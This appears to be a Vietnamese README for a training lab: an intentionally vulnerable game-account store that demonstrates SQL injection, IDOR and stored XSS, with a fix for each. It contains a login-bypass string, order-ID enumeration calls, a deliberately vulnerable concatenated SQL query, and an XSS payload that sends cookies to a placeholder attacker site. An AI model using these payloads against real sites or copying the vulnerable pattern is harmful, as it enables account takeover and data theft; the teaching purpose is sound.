# 🛡️ Hướng dẫn Bảo mật: Khai thác & Khắc phục lỗi Web

Dự án này mô phỏng một trang web bán account game với 3 lỗ bảo mật nghiêm trọng. Dưới đây là chi tiết cách hacker tấn công và cách lập trình viên bảo vệ hệ thống.

---

## 1. SQL Injection (SQLi)
**Vị trí:** Chức năng Đăng nhập (`/api/auth/login`)

### 🔴 Cách Hacker tấn công
Lập trình viên sử dụng chuỗi truy vấn SQL bằng cách cộng chuỗi trực tiếp từ input của người dùng:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Kịch bản tấn công:**
1. Mở trang Đăng nhập.
2. Nhập vào ô Username: `' OR 1=1 --`
3. Nhập mật khẩu bất kỳ (ví dụ: `abc`).
4. **Kết quả:** Câu truy vấn trở thành:
   `SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'abc'`
   - `1=1` luôn đúng.
   - `--` là ký hiệu comment trong SQL, làm vô hiệu hóa phần kiểm tra password phía sau.
   - Hacker sẽ đăng nhập thành công vào tài khoản đầu tiên trong database (thường là `admin`).

### 🟢 Cách Khắc phục (Vá lỗi)
Sử dụng **Parameterized Queries** (Truy vấn có tham số) thay vì cộng chuỗi. Các thư viện DB hiện đại đều hỗ trợ việc này để tự động "escape" các ký tự nguy hiểm.

**File [server.js](file:///home/lowlevelguy/SECURITY/IDOR/server.js) nên sửa thành:**
```javascript
// ✅ Sử dụng dấu hỏi chấm (?) và truyền tham số riêng biệt
const user = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password);
```

---

## 2. IDOR (Insecure Direct Object Reference)
**Vị trí:** Xem chi tiết đơn hàng (`/api/orders/:orderId`)

### 🔴 Cách Hacker tấn công
Hệ thống chỉ kiểm tra xem người dùng đã đăng nhập chưa, nhưng **không kiểm tra** xem đơn hàng đó có thuộc về người dùng đó hay không.

**Kịch bản tấn công:**
1. Đăng ký một tài khoản mới và đăng nhập.
2. Mua một món hàng rẻ nhất để có ID đơn hàng (ví dụ: ID là `10`).
3. Truy cập vào trang chi tiết đơn hàng.
4. Hacker mở **Developer Tools (F12)** -> Tab **Console** hoặc chỉnh sửa trực tiếp URL gọi API.
5. Hacker thử đổi ID thành các số khác: `fetch('/api/orders/1')`, `fetch('/api/orders/2')`...
6. **Kết quả:** Hacker có thể xem được nội dung account (username/password) của tất cả khách hàng khác đã mua trên web.

### 🟢 Cách Khắc phục (Vá lỗi)
Luôn kiểm tra quyền sở hữu (Ownership) của tài nguyên trước khi trả về dữ liệu.

**File [server.js](file:///home/lowlevelguy/SECURITY/IDOR/server.js) nên sửa thành:**
```javascript
app.get('/api/orders/:orderId', requireAuth, (req, res) => {
  const { orderId } = req.params;
  
  // ✅ Thêm điều kiện user_id = ? vào câu truy vấn
  const order = db.prepare(`
    SELECT o.*, a.title as account_title FROM orders o
    JOIN accounts a ON o.account_id = a.id
    WHERE o.id = ? AND o.user_id = ?
  `).get(orderId, req.user.id); // req.user.id lấy từ JWT token của người đang gọi API

  if (!order) return res.status(403).json({ error: 'Bạn không có quyền xem hoặc đơn hàng không tồn tại' });
  res.json(order);
});
```

---

## 3. Stored Cross-Site Scripting (XSS)
**Vị trí:** Chức năng Đánh giá sản phẩm (`/api/reviews`)

### 🔴 Cách Hacker tấn công
Hệ thống lưu trực tiếp nội dung đánh giá vào database và hiển thị ra frontend bằng `innerHTML` mà không qua xử lý.

**Kịch bản tấn công:**
1. Hacker tạo một đánh giá với nội dung chứa mã JavaScript:
   ```html
   Rất hài lòng! <script>fetch('https://hacker-site.com/steal?cookie=' + document.cookie)</script>
   ```
2. **Hoặc** đơn giản hơn để phá hoại giao diện:
   ```html
   <img src=x onerror="document.body.style.background='red'; alert('Hacked!')">
   ```
3. **Kết quả:** Mỗi khi có khách hàng khác vào xem sản phẩm đó, mã JavaScript của hacker sẽ tự động thực thi trên trình duyệt của khách hàng đó, cho phép hacker đánh cắp tài khoản (cookie), session hoặc thực hiện hành động giả mạo.

### 🟢 Cách Khắc phục (Vá lỗi)

**Bước 1: Sanitize ở Backend** (Khuyên dùng)
Sử dụng thư viện như `dompurify` hoặc `xss` để loại bỏ các thẻ nguy hiểm trước khi lưu vào DB.

**Bước 2: Hiển thị an toàn ở Frontend** (Quan trọng nhất)
Tuyệt đối không dùng `.innerHTML` cho dữ liệu do người dùng nhập vào. Luôn dùng `.textContent` hoặc các phương thức tự động escape.

**File [public/app.js](file:///home/lowlevelguy/SECURITY/IDOR/public/app.js) nên sửa thành:**
```javascript
// ✅ KHÔNG DÙNG: products.innerHTML = `<div>${r.content}</div>`
// ✅ NÊN DÙNG: Tạo element và gán textContent
const contentDiv = document.createElement('div');
contentDiv.textContent = r.content; // Trình duyệt sẽ coi <script> chỉ là văn bản bình thường, không thực thi.
```

---

## 🚀 Cách chạy dự án để test
1. Mở terminal tại thư mục dự án: `cd /home/lowlevelguy/SECURITY/IDOR`
2. Cài đặt thư viện: `npm install`
3. Chạy server: `npm start`
4. Truy cập: `http://localhost:3000`

> **Lưu ý:** Đây là dự án phục vụ học tập. Đừng bao giờ áp dụng các code "🔴" vào dự án thực tế!
